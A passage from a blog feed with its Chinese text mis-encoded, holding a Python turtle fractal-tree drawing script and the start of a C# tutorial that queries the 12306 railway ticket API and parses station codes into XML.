<h2 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 2, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># drawtree.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">plist, l, a, f</span>):</span><br><span class="line">    <span class="comment">#å®½åº¦ä¼˜å…ˆç»˜åˆ¶æ³•</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; plist is list of pens</span></span><br><span class="line"><span class="string">    l is length of branch</span></span><br><span class="line"><span class="string">    a is half of the angle between 2 branches</span></span><br><span class="line"><span class="string">    f is factor by which branch is shortened</span></span><br><span class="line"><span class="string">    from level to level.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> l &gt; <span class="number">5</span>:</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plist:</span><br><span class="line">            p.forward(l)<span class="comment">#Move the turtle forward by the specified distance, in the direction the turtle is headed.</span></span><br><span class="line">            q = p.clone()<span class="comment">#Create and return a clone of the turtle with same position, heading and turtle properties.</span></span><br><span class="line">            p.left(a) <span class="comment">#Turn turtle left by angle units</span></span><br><span class="line">            q.right(a)<span class="comment"># turn turtle right by angle units, nits are by default degrees, but can be set via the degrees() and radians() functions.</span></span><br><span class="line">            lst.append(p)</span><br><span class="line">            lst.append(q)</span><br><span class="line">        tree(lst, l*f, a, f)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree2</span>(<span class="params">p,l,a,f</span>):</span><br><span class="line">    <span class="comment">#æ·±åº¦ä¼˜å…ˆç»˜åˆ¶æ³•</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;<span class="number">5</span>:</span><br><span class="line">        p.forward(l)</span><br><span class="line">        q=p.clone()</span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        tree2(p, l*f, a, f)</span><br><span class="line">        tree2(q, l*f, a, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maketree</span>(<span class="params">x,y</span>):     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">5</span>)</span><br><span class="line">    p.setundobuffer(<span class="literal">None</span>)</span><br><span class="line">    p.hideturtle() </span><br><span class="line">    <span class="comment">#Make the turtle invisible. Itâ€™s a good idea to do this while youâ€™re in the middle of doing some complex drawing,</span></span><br><span class="line">    <span class="comment">#because hiding the turtle speeds up the drawing observably.</span></span><br><span class="line">    <span class="comment">#p.speed(9)</span></span><br><span class="line">    p.getscreen().tracer(<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#Return the TurtleScreen object the turtle is drawing on.</span></span><br><span class="line">    <span class="comment">#TurtleScreen methods can then be called for that object.</span></span><br><span class="line">    p.left(<span class="number">90</span>)<span class="comment"># Turn turtle left by angle units. direction</span></span><br><span class="line"> </span><br><span class="line">    p.penup() <span class="comment">#Pull the pen up â€“ no drawing when moving.</span></span><br><span class="line">    p.goto(x,y)<span class="comment">#Move turtle to an absolute position. If the pen is down, draw line. Do not change the turtleâ€™s orientation.</span></span><br><span class="line">    p.pendown()<span class="comment"># Pull the pen down â€“ drawing when moving. </span></span><br><span class="line">    <span class="comment">#è¿™ä¸‰æ¡è¯­å¥æ˜¯ä¸€ä¸ªç»„åˆç›¸å½“äºå…ˆæŠŠç¬”æ”¶èµ·æ¥å†ç§»åŠ¨åˆ°æŒ‡å®šä½ç½®ï¼Œå†æŠŠç¬”æ”¾ä¸‹å¼€å§‹ç”».å¦åˆ™turtleä¸€ç§»åŠ¨å°±ä¼šè‡ªåŠ¨çš„æŠŠçº¿ç”»å‡ºæ¥</span></span><br><span class="line"> </span><br><span class="line">    tree([p], <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>)</span><br><span class="line">    </span><br><span class="line">    p.penup() </span><br><span class="line">    p.setheading(<span class="number">90</span>)<span class="comment">#Set the orientation of the turtle to to_angle.</span></span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.down()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    tree2(p, <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maketree(-<span class="number">200</span>, -<span class="number">200</span>)</span><br><span class="line">    maketree(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    maketree(<span class="number">200</span>,-<span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img data-src="/images/20171202204712994.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨c#ä¸­çš„HttpWebRequestå®ç°12306ä½™ç¥¨æŸ¥è¯¢</title>
    <url>/posts/1797370495/</url>
    <content><![CDATA[<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ol>
<li>ä¸‹è½½ç”¨äºè§£æJSONçš„ç±»åº“(Newtonsoft.Json.dll)(ä¸‹è½½åœ°å€:<a href="https://archive.codeplex.com/?p=json">Newtonsoft.Json.dll</a>)ï¼›</li>
<li>åœ¨C#é¡¹ç›®ä¸­æ·»åŠ å¯¹å…¶çš„å¼•ç”¨ã€‚</li>
<li>åœ¨ç¨‹åºä¸­å¯¼å…¥å‘½åç©ºé—´:<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
</ol>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><h3 id="APIåœ°å€"><a href="#APIåœ°å€" class="headerlink" title="APIåœ°å€"></a>APIåœ°å€</h3><p>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€12306ä¸»é¡µï¼Œç‚¹å‡»<strong>ä½™ç¥¨æŸ¥è¯¢</strong>ï¼Œå¹¶ä½¿ç”¨æµè§ˆå™¨ä¸­çš„å¼€å‘è€…å·¥å…·ï¼Œè¿›è¡ŒæŠ“åŒ…ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯2018.06.25çš„ä¸Šæµ·è‡³é•¿æ²™çš„è½¦ç¥¨ä¿¡æ¯ã€‚<br><img data-src="/images/trainticket1.jpg" alt="å¼€å‘è€…å·¥å…·æŠ“åŒ…"><br>æ­¤æ—¶æµè§ˆå™¨å‘é€è¯·æ±‚çš„åœ°å€ä¸ºï¼š<br><code>https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=2018-06-25&amp;leftTicketDTO.from_station=SHH&amp;leftTicketDTO.to_station=CSQ&amp;purpose_codes=ADULT</code><br>ç”±æ­¤,æˆ‘ä»¬ä¸éš¾åˆ†æå‡ºAPIåœ°å€ä¸ºï¼š</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> url=<span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=&#123;0&#125;&amp;leftTicketDTO.from_station=&#123;1&#125;&amp;leftTicketDTO.to_station=&#123;2&#125;&amp;purpose_codes=&#123;3&#125;&quot;</span>;</span><br><span class="line">url=<span class="built_in">string</span>.Format(url,date,<span class="keyword">from</span>,to,id);</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œdateä»£è¡¨å‡ºå‘æ—¥(æ ¼å¼ä¸ºyyyy-MM-dd),fromä»£è¡¨å‡ºå‘ç«™çš„ä»£ç ï¼Œtoä»£è¡¨åˆ°è¾¾ç«™çš„ä»£ç ï¼Œidä»£è¡¨è½¦ç¥¨ç±»å‹(æˆäººä¸º<code>ADULT</code>,å­¦ç”Ÿä¸º<code>OX00</code>);</p>
<h3 id="è½¦ç«™ä»£ç "><a href="#è½¦ç«™ä»£ç " class="headerlink" title="è½¦ç«™ä»£ç "></a>è½¦ç«™ä»£ç </h3><p>è½¦ç«™å¯¹åº”çš„ä»£ç å¯åœ¨æ­¤ä¸‹è½½:<a href="https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9055">https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version&#x3D;1.9055</a><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»ä¸­æå–å‡ºå…³é”®ä¿¡æ¯ï¼Œå¹¶ä¿å­˜åœ¨ä¸€ä¸ªXMLæ–‡æ¡£ä¸­ï¼Œä¾¿äºä»¥åçš„ä½¿ç”¨ã€‚</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StationNameXml</span>()</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">string</span> nowpath = Environment.CurrentDirectory;</span><br><span class="line">         <span class="keyword">if</span> (Directory.Exists(nowpath+<span class="string">&quot;/Data&quot;</span>)==<span class="literal">false</span>)</span><br><span class="line">             Directory.CreateDirectory(nowpath + <span class="string">&quot;/Data&quot;</span>);<span class="comment">//åˆ›å»ºæ–°è·¯å¾„</span></span><br><span class="line">         <span class="keyword">if</span> (File.Exists(nowpath + <span class="string">&quot;/Data/StationName.xml&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">HttpWebRequest request;</span><br><span class="line">  		HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">string</span> url=<span class="string">@&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9055&quot;</span>;</span><br><span class="line"></span><br><span class="line">         request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">         request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">         request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">         request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">         <span class="keyword">try</span></span><br><span class="line">         &#123;</span><br><span class="line">             response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">             <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">             &#123;</span><br><span class="line">                 StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                 str = sr.ReadToEnd();</span><br><span class="line">                 sr.Close();</span><br><span class="line">                 response.Close();<span class="comment">//å…³é—­responseå“åº”æµ</span></span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">catch</span>(Exception e)</span><br><span class="line">         &#123;</span><br><span class="line">	Console.WriteLine(e.Message);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">string</span> pattern = <span class="string">@&quot;@\S&#123;2,5&#125;?[|](?&lt;Name&gt;\S&#123;1,8&#125;?)[|](?&lt;Code&gt;\S&#123;3,5&#125;?)[|]&quot;</span>;</span><br><span class="line">         Regex r = <span class="keyword">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class="line"></span><br><span class="line">         XmlDocument xmldoc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">         XmlDeclaration xmldecl;</span><br><span class="line"></span><br><span class="line">         xmldecl = xmldoc.CreateXmlDeclaration(<span class="string">&quot;1.0&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>);<span class="comment">//åŠ å…¥XMLçš„å£°æ˜æ®µè½</span></span><br><span class="line">         xmldoc.AppendChild(xmldecl);</span><br><span class="line"></span><br><span class="line">         XmlElement root = xmldoc.CreateElement(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Dict&quot;</span>, <span class="string">&quot;&quot;</span>);<span class="comment">//åŠ å…¥ä¸€ä¸ªæ ¹å…ƒç´ </span></span><br><span class="line">         xmldoc.AppendChild(root);</span><br><span class="line"></span><br><span class="line">         MatchCollection mc = r.Matches(str);</span><br><span class="line">         <span class="keyword">foreach</span> (Match m <span class="keyword">in</span> mc)</span><br><span class="line">         &#123;</span><br><span class="line">             GroupCollection <span class="keyword">group</span> = m.Groups;</span><br><span class="line">             XmlNode node = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Pair&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">             XmlNode temp = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Station&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">             temp.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Name&quot;</span>].Value; </span><br><span class="line">             node.AppendChild(temp);</span><br><span class="line"></span><br><span class="line">             XmlNode temp2 = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Code&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">             temp2.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Code&quot;</span>].Value;</span><br><span class="line">             node.AppendChild(temp2);</span><br><span class="line"></span><br><span class="line">             root.AppendChild(node);</span><br><span class="line">         &#125;</span><br><span class="line">         xmldoc.Save(nowpath+<span class="string">&quot;/Data/&quot;</span>+<span class="string">&quot;StationName.xml&quot;</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="/images/trainticket2.jpg" alt="è½¦ç«™ä»£ç "><br>ä¾æ®ä¸­æ–‡è½¦ç«™åè·å–å¯¹åº”è½¦ç«™ä»£ç çš„æ–¹æ³•ä¸º:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">StationCode</span>(<span class="params"><span class="built_in">string</span> StationName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    XmlDocument doc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">    doc.Load(Environment.CurrentDirectory + <span class="string">&quot;/Data/StationName.xml&quot;</span>);</span><br><span class="line">    XmlNodeList data = doc.DocumentElement.ChildNodes;</span><br><span class="line">    <span class="keyword">foreach</span> (XmlNode node <span class="keyword">in</span> data)</span><br><span class="line">    &#123;</span><br><span class="line">        XmlElement xe = (XmlElement)node;</span><br><span class="line">        XmlNodeList xnl0 = xe.ChildNodes;</span><br><span class="line">        <span class="built_in">string</span> s = xnl0.Item(<span class="number">0</span>).InnerText;</span><br><span class="line">        <span class="keyword">if</span>(s==StationName)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> xnl0.Item(<span class="number">1</span>).InnerText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ•°æ®æ¨¡å‹"><a href="#æ•°æ®æ¨¡å‹" class="headerlink" title="æ•°æ®æ¨¡å‹"></a>æ•°æ®æ¨¡å‹</h3><p>ä¸ºäº†å­˜å‚¨æŸ¥è¯¢ç»“æœï¼Œæˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªè½¦ç¥¨çš„æ•°æ®æ¨¡å‹ï¼Œå…·ä½“å¦‚ä¸‹ï¼›</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Ticket</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="meta">#<span class="keyword">region</span> æ•°æ®æ¨¡å‹</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> trainid=<span class="built_in">string</span>.Empty;<span class="comment">//è½¦æ¬¡</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> fromstation = <span class="string">&quot;--&quot;</span>;<span class="comment">//å‡ºå‘ç«™</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> totation = <span class="string">&quot;--&quot;</span>;<span class="comment">//åˆ°è¾¾ç«™</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> ticketdate = <span class="built_in">string</span>.Empty;<span class="comment">//è½¦ç¥¨æ—¥æœŸ</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> starttime = <span class="string">&quot;--&quot;</span>;<span class="comment">//å‘è½¦æ—¶é—´</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> arrivetime = <span class="string">&quot;--&quot;</span>;<span class="comment">//åˆ°è¾¾æ—¶é—´</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> lastedtime = <span class="string">&quot;--&quot;</span>;<span class="comment">//å†æ—¶</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> tzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//ç‰¹ç­‰åº§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> ydNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//ä¸€ç­‰åº§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> edNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//äºŒç­‰åº§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> grwNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//é«˜çº§è½¯å§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> rwNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//è½¯å§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> dwNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//åŠ¨å§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> ywNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//ç¡¬å§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> rzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//è½¯åº§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> yzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//ç¡¬åº§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> wzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//æ— åº§</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> qtNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//å…¶ä»–</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> identity = <span class="built_in">string</span>.Empty;<span class="comment">//è½¦ç¥¨ç±»å‹(å­¦ç”Ÿ/æˆäºº)</span></span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> TrainId &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> trainid; &#125; <span class="keyword">set</span> &#123; trainid = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> FromStation &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> fromstation; &#125; <span class="keyword">set</span> &#123; fromstation = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> ToStation &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> totation; &#125; <span class="keyword">set</span> &#123; totation = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> TicketDate &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> ticketdate; &#125; <span class="keyword">set</span> &#123; ticketdate = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> StartTime &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> starttime; &#125; <span class="keyword">set</span> &#123; starttime = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> ArriveTime &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> arrivetime; &#125;<span class="keyword">set</span> &#123; arrivetime = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> LastedTime &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> lastedtime; &#125; <span class="keyword">set</span> &#123; lastedtime = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> TzNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> tzNum; &#125; <span class="keyword">set</span> &#123; tzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> YdNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> ydNum; &#125; <span class="keyword">set</span> &#123; ydNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> EdNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> edNum; &#125; <span class="keyword">set</span> &#123; edNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> GrwNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> grwNum; &#125; <span class="keyword">set</span> &#123; grwNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> RwNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> rwNum; &#125; <span class="keyword">set</span> &#123; rwNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> DwNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> dwNum; &#125; <span class="keyword">set</span> &#123; dwNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> YwNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> ywNum; &#125;<span class="keyword">set</span>&#123; ywNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> RzNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> rzNum; &#125;<span class="keyword">set</span>&#123; rzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> YzNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> yzNum; &#125;<span class="keyword">set</span>&#123; yzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> WzNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> wzNum; &#125;<span class="keyword">set</span>&#123; wzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> QtNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> qtNum; &#125;<span class="keyword">set</span>&#123; qtNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> Identity &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> identity; &#125;<span class="keyword">set</span> &#123; identity = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="title">Ticket</span>()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; <span class="title">getMap</span>()</span></span><br><span class="line">       &#123;</span><br><span class="line">           Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; result = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">           result.Add(<span class="string">&quot;è½¦æ¬¡&quot;</span>, trainid);</span><br><span class="line">           result.Add(<span class="string">&quot;å‡ºå‘ç«™&quot;</span>, FromStation);</span><br><span class="line">           result.Add(<span class="string">&quot;åˆ°è¾¾ç«™&quot;</span>, ToStation);</span><br><span class="line">           result.Add(<span class="string">&quot;å‘è½¦æ—¶é—´&quot;</span>, StartTime);</span><br><span class="line">           result.Add(<span class="string">&quot;åˆ°è¾¾æ—¶é—´&quot;</span>, ArriveTime);</span><br><span class="line">           result.Add(<span class="string">&quot;å†æ—¶&quot;</span>, LastedTime);</span><br><span class="line">           result.Add(<span class="string">&quot;ç‰¹ç­‰åº§&quot;</span>, TzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;ä¸€ç­‰åº§&quot;</span>, YdNum);</span><br><span class="line">           result.Add(<span class="string">&quot;äºŒç­‰åº§&quot;</span>, EdNum);</span><br><span class="line">           result.Add(<span class="string">&quot;é«˜çº§è½¯å§&quot;</span>, GrwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;è½¯å§&quot;</span>, RwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;åŠ¨å§&quot;</span>, DwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;ç¡¬å§&quot;</span>, YwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;è½¯åº§&quot;</span>, RzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;ç¡¬åº§&quot;</span>, YzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;æ— åº§&quot;</span>, WzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;å…¶ä»–&quot;</span>, QtNum);</span><br><span class="line">           <span class="keyword">return</span> result;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è§£æJSON"><a href="#è§£æJSON" class="headerlink" title="è§£æJSON"></a>è§£æJSON</h3><p><img data-src="/images/trainticket3.jpg" alt="JSONæ ¼å¼çš„å­—ç¬¦ä¸²"><br>è¿”å›çš„æŠ¥æ–‡ä¸ºä¸€ä¸ªJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œé‡Œé¢åŒ…å«æœ‰å„ç±»è½¦ç¥¨ä¿¡æ¯ã€å‘è½¦æ—¶é—´ä»¥åŠå†æ—¶ï¼Œä¸ºäº†å¯¹å…¶è¿›è¡Œè§£æï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ä¸€ä¸ªç”¨äºè§£æJSONçš„ç±»åº“(ä¸‹è½½åœ°å€:<a href="https://archive.codeplex.com/?p=json">Newtonsoft.Json.dll</a>)</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Ticket[] <span class="title">SpiderTicket</span>(<span class="params"><span class="built_in">string</span> date, <span class="built_in">string</span> <span class="keyword">from</span>, <span class="built_in">string</span> to, <span class="built_in">string</span> id</span>)</span></span><br><span class="line"> &#123;</span><br><span class="line">     HttpWebRequest request;</span><br><span class="line">     HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">string</span> url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=&#123;0&#125;&amp;leftTicketDTO.from_station=&#123;1&#125;&amp;leftTicketDTO.to_station=&#123;2&#125;&amp;purpose_codes=&#123;3&#125;&quot;</span>;</span><br><span class="line">     url = <span class="built_in">string</span>.Format(url, date, <span class="keyword">from</span>, to, id);</span><br><span class="line"></span><br><span class="line">     request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">     request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">     request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">     request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">     <span class="keyword">try</span></span><br><span class="line">     &#123;</span><br><span class="line">         response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">         <span class="keyword">if</span> (response.StatusCode 